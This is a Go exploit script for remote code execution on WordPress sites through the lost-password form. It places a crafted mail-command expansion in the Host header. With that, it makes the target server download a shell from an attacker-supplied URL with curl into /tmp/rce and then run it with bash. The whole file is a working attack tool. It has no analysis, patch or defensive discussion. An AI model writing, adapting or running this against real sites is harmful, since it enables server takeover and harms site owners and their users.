package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./exploit <WordPress_URL> <Shell_URL>")
		return
	}

	// Arguments for target and shell url
	target := os.Args[1]
	shellURL := os.Args[2]

	// current user of available accounts of target user
	// http://<target>/wp-json/wp/v2/users

	user := "admin"

	// generate command line
	command := fmt.Sprintf("${run{%s}}", "/usr/bin/curl -o/tmp/rce "+shellURL)
	command = strings.ReplaceAll(command, "/", "${substr{0}{1}{$spool_directory}}")
	command = strings.ReplaceAll(command, " ", "${substr{10}{1}{$tod_log}}")
	hostHeader := fmt.Sprintf("target(any -froot@localhost -be %s null)", command)

	// create session
	client := &http.Client{}
	data := map[string]string{
		"user_login":  user,
		"redirect_to": "",
		"wp-submit":   "Get New Password",
	}
	targetURL := target + "/wp-login.php?action=lostpassword"
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(encodeValues(data)))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	req.Header.Set("Host", hostHeader)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	//session
	if resp.StatusCode != http.StatusOK {
		fmt.Println("Error: unexpected status code:", resp.StatusCode)
		return
	}

	// generate command
	command = fmt.Sprintf("${run{%s}}", "/bin/bash /tmp/rce")
	hostHeader = fmt.Sprintf("target(any -froot@localhost -be %s null)", command)

	// rebuild session 
	req, err = http.NewRequest("POST", targetURL, strings.NewReader(encodeValues(data)))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	req.Header.Set("Host", hostHeader)
	resp, err = client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	// read response
	if resp.StatusCode != http.StatusOK {
		fmt.Println("Error: unexpected status code:", resp.StatusCode)
		return
	}

	fmt.Println("Exploit executed successfully.")
}

func encodeValues(data map[string]string) string {
	var buf bytes.Buffer
	for key, value := range data {
		buf.WriteString(key)
		buf.WriteString("=")
		buf.WriteString(value)
		buf.WriteString("&")
	}
	return buf.String()
}
